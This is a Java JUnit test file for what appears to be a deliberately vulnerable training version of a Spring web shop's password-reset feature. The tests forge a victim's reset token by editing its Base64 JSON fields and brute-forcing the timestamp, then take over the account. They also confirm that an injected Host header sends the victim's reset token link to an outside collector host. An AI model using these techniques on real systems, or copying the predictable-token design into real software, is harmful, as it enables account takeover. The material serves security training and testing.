package com.docker.atsea.test;

import com.docker.atsea.controller.LoginController;
import com.docker.atsea.controller.PasswordResetController;
import com.docker.atsea.model.Customer;
import com.docker.atsea.repositories.CustomerRepository;
import com.docker.atsea.service.CustomerService;
import com.docker.atsea.service.PasswordResetService;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.util.Base64;
import javax.servlet.Filter;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Import;
import org.springframework.test.context.ContextConfiguration;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.context.web.WebAppConfiguration;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;
import org.springframework.web.context.WebApplicationContext;

import static org.hamcrest.Matchers.containsString;
import static org.hamcrest.Matchers.not;
import static org.junit.Assert.*;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

@RunWith(SpringRunner.class)
@WebAppConfiguration
@ContextConfiguration(classes = PasswordResetTest.Config.class)
public class PasswordResetTest {
    @Autowired WebApplicationContext context;
    @Autowired Filter springSecurityFilterChain;
    @Autowired CustomerRepository customers;
    @Autowired PasswordResetService resets;
    private MockMvc mvc;

    @Before
    public void setUp() {
        customers.deleteAll();
        customers.save(customer("attacker", "USER"));
        customers.save(customer("victim", "USER"));
        customers.save(customer("admin", "ADMIN"));
        mvc = MockMvcBuilders.webAppContextSetup(context).addFilters(springSecurityFilterChain).build();
    }

    private Customer customer(String name, String role) {
        return new Customer(null, name, "Dojo street", name + "@example.test",
                "123456", name, "old-password", true, role);
    }

    private String basic(String name) {
        return "Basic " + Base64.getEncoder().encodeToString(
                (name + ":old-password").getBytes(StandardCharsets.UTF_8));
    }

    private String latestToken() {
        return resets.getEmails().get(0).getResetLink().split("token=", 2)[1];
    }

    private void request(String username, String host) throws Exception {
        mvc.perform(post("/forgot-password").accept("text/html").header("Host", host).param("username", username))
                .andExpect(status().isOk())
                .andExpect(content().string(containsString("If that account exists")));
    }

    @Test
    public void forgedJsonWithBruteForcedTimestampChangesVictimPasswordAndAllowsLogin() throws Exception {
        request("attacker", "shop.example.test:8080");
        String ownToken = latestToken();
        ObjectNode payload = (ObjectNode) new ObjectMapper().readTree(Base64.getUrlDecoder().decode(ownToken));
        assertEquals("attacker", payload.get("user").asText());
        assertTrue(payload.get("token").isIntegralNumber());
        assertTrue(payload.get("timestamp").isIntegralNumber());
        long firstSecond = Instant.now().getEpochSecond();
        request("victim", "shop.example.test:8080");
        long lastSecond = Instant.now().getEpochSecond();
        payload.put("token", payload.get("token").asLong() + 1);
        payload.put("timestamp", firstSecond - 1);
        // The counter alone is insufficient: both the intended user and exact second must match.
        assertFalse(resets.isValid(encode(payload)));
        payload.put("user", "victim");
        assertFalse(resets.isValid(encode(payload)));
        String predicted = null;
        // Do not read the victim's email: enumerate only the observed request time window.
        for (long second = firstSecond; second <= lastSecond; second++) {
            payload.put("timestamp", second);
            String candidate = encode(payload);
            int status = mvc.perform(post("/reset-password").accept("text/html")
                    .param("token", candidate).param("password", "new-password"))
                    .andReturn().getResponse().getStatus();
            if (status == 200) {
                predicted = candidate;
                break;
            }
            assertEquals(400, status);
        }
        assertNotNull("A timestamp in the request window should match", predicted);
        assertEquals("old-password", customers.findByUserName("attacker").getPassword());
        assertEquals("new-password", customers.findByUserName("victim").getPassword());
        mvc.perform(post("/login/").contentType("application/json")
                .content("{\"username\":\"victim\",\"password\":\"new-password\"}"))
                .andExpect(status().isOk()).andExpect(jsonPath("$.token").exists());
        mvc.perform(post("/login/").contentType("application/json")
                .content("{\"username\":\"victim\",\"password\":\"old-password\"}"))
                .andExpect(status().isUnauthorized());
        mvc.perform(post("/reset-password").accept("text/html").param("token", predicted).param("password", "again"))
                .andExpect(status().isBadRequest());
    }

    private String encode(ObjectNode payload) {
        return Base64.getUrlEncoder().withoutPadding().encodeToString(
                payload.toString().getBytes(StandardCharsets.UTF_8));
    }

    @Test
    public void allJsonFieldsMustMatchTheIssuedToken() throws Exception {
        request("victim", "shop.example.test");
        String token = latestToken();
        ObjectNode issued = (ObjectNode) new ObjectMapper().readTree(Base64.getUrlDecoder().decode(token));
        assertEquals("victim", issued.get("user").asText());
        assertEquals(token, encode(issued));
        assertFalse(token.contains("="));
        ObjectNode wrongUser = issued.deepCopy();
        wrongUser.put("user", "attacker");
        ObjectNode wrongCounter = issued.deepCopy();
        wrongCounter.put("token", issued.get("token").asLong() + 1);
        ObjectNode wrongSecond = issued.deepCopy();
        wrongSecond.put("timestamp", issued.get("timestamp").asLong() + 1);
        for (ObjectNode changed : new ObjectNode[] {wrongUser, wrongCounter, wrongSecond}) {
            mvc.perform(post("/reset-password").accept("text/html")
                    .param("token", encode(changed)).param("password", "changed"))
                    .andExpect(status().isBadRequest());
        }
        assertTrue(resets.isValid(token));
        assertEquals("old-password", customers.findByUserName("victim").getPassword());
    }

    @Test
    public void injectedHostAppearsInVictimEmailAsClickableTokenLink() throws Exception {
        request("victim", "collector.example.test:9000");
        String token = latestToken();
        mvc.perform(get("/admin/emails").accept("text/html").header("Authorization", basic("admin")))
                .andExpect(status().isOk())
                .andExpect(content().contentTypeCompatibleWith("text/html"))
                .andExpect(content().string(containsString("victim@example.test")))
                .andExpect(content().string(containsString(
                        "href=\"http://collector.example.test:9000/reset-password?token=" + token + "\"")));
        assertTrue(resets.isValid(token)); // Viewing the outbox must not consume the token.
    }

    @Test
    public void outboxRequiresAdminIncludingCaseVariantsAndEscapesEmailText() throws Exception {
        for (String path : new String[] {"/admin/emails", "/admin/emails/", "/ADMIN/EMAILS"}) {
            mvc.perform(get(path).accept("text/html")).andExpect(status().isUnauthorized());
            mvc.perform(get(path).accept("text/html").header("Authorization", basic("attacker")))
                    .andExpect(status().isForbidden());
        }
        Customer victim = customers.findByUserName("victim");
        victim.setEmail("<script>alert(1)</script>");
        customers.save(victim);
        request("victim", "shop.example.test");
        mvc.perform(get("/admin/emails").accept("text/html").header("Authorization", basic("admin")))
                .andExpect(status().isOk())
                .andExpect(content().string(containsString("&lt;script&gt;")))
                .andExpect(content().string(not(containsString("<script>"))));
    }

    @Test
    public void invalidInputAndSupersededTokensDoNotChangePassword() throws Exception {
        mvc.perform(get("/forgot-password").accept("text/html")).andExpect(status().isOk());
        mvc.perform(get("/reset-password").accept("text/html")).andExpect(status().isBadRequest());
        mvc.perform(post("/reset-password").accept("text/html").param("token", "not-base64").param("password", "changed"))
                .andExpect(status().isBadRequest());
        request("victim", "shop.example.test");
        String oldToken = latestToken();
        request("victim", "shop.example.test");
        String token = latestToken();
        assertFalse(resets.isValid(oldToken));
        for (String password : new String[] {"", "   ", String.join("", java.util.Collections.nCopies(256, "x"))}) {
            mvc.perform(post("/reset-password").accept("text/html").param("token", token).param("password", password))
                    .andExpect(status().isBadRequest());
        }
        assertTrue(resets.isValid(token));
        assertEquals("old-password", customers.findByUserName("victim").getPassword());
    }

    @Test
    public void unknownOrDisabledAccountsDoNotGenerateEmailOrConsumeCounter() throws Exception {
        request("attacker", "shop.example.test");
        String token = latestToken();
        int count = resets.getEmails().size();
        request("missing", "shop.example.test");
        Customer victim = customers.findByUserName("victim");
        victim.setEnabled(false);
        customers.save(victim);
        request("victim", "shop.example.test");
        assertEquals(count, resets.getEmails().size());
        assertEquals(token, latestToken());
    }

    @Configuration
    @Import(BlindXssPurchaseTest.Config.class)
    static class Config {
        @Bean PasswordResetService resets(CustomerService customers) { return new PasswordResetService(customers); }
        @Bean PasswordResetController resetController(PasswordResetService resets) { return new PasswordResetController(resets); }
        @Bean LoginController loginController() { return new LoginController(); }
    }
}
